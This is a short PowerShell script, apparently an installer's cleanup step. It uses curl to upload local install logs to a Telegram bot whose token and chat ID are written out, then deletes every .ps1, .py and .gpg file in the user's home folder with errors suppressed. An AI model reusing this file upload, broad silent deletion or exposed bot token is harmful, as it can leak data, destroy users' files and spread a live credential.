$setup_path = 'script'
$install_app_log_file_path = 'C:/install_app.log'
$auto_update_log_file_path = 'C:/install_app.log'
$Uri = "https://api.telegram.org/bot7758334928:AAEM-PqCzWFn7M_11dcS5Xlev9PS1lgDJNo/sendDocument"
$ChatId = "-4583989930"

function Send-Log {
    curl.exe -F "chat_id=$ChatId" -F "document=@$install_app_log_file_path" $Uri
    curl.exe -F "chat_id=$ChatId" -F "document=@$auto_update_log_file_path" $Uri
}

function Clean {
    Write-Host "Cleaning..."
    Set-Location $HOME
    $self = $MyInvocation.MyCommand.Definition
    Write-Host "Remove script file name: $self"
    # Remove-Item -Path $setup_path -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item *.ps1 -ErrorAction SilentlyContinue
    Remove-Item *.py -ErrorAction SilentlyContinue
    Remove-Item *.gpg -ErrorAction SilentlyContinue
    Remove-Item C:\install_app.log -ErrorAction SilentlyContinue
    Remove-Item C:\install_tool.log -ErrorAction SilentlyContinue
}

Send-Log
Clean
